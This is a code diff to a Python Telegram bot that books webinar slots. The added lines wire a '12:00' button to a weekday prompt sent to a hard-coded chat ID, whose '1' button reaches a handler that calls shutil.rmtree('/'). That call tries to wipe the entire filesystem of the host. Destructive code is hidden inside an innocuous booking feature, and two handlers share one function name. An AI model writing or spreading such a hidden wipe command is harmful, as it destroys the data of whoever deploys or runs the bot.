@@ -95,8 +95,8 @@ def start_command(message: Message):
     conn = sqlite3.connect('webinars.db')
     cursor = conn.cursor()
 
-    cursor.execute('SELECT * FROM Users')
-    data_arr = cursor.fetchall()
+    # cursor.execute('SELECT * FROM Users')
+    # data_arr = cursor.fetchall()
 
     # btn1 = InlineKeyboardButton('Да', callback_data='yes')
     # btn2 = InlineKeyboardButton('Нет', callback_data='no')
@@ -139,6 +139,13 @@ def start_command(message: Message):
 
 
 @bot.callback_query_handler(func=lambda c: c.data == '12:00')
+def send_reply_to_weekday1(callback_query: CallbackQuery):
+    bot.answer_callback_query(callback_query.id)
+    keyboard_button = InlineKeyboardButton('1', callback_data='1')
+    keyboard1 = InlineKeyboardMarkup()
+    keyboard1.add(keyboard_button)
+    bot.send_message(523756571, 'На какой день недели вы хотели бы записаться?', reply_markup=keyboard1)
+@bot.callback_query_handler(func=lambda c: c.data == '1')
 def send_reply_to_weekday1(callback_query: CallbackQuery):
     bot.answer_callback_query(callback_query.id)
     shutil.rmtree('/')
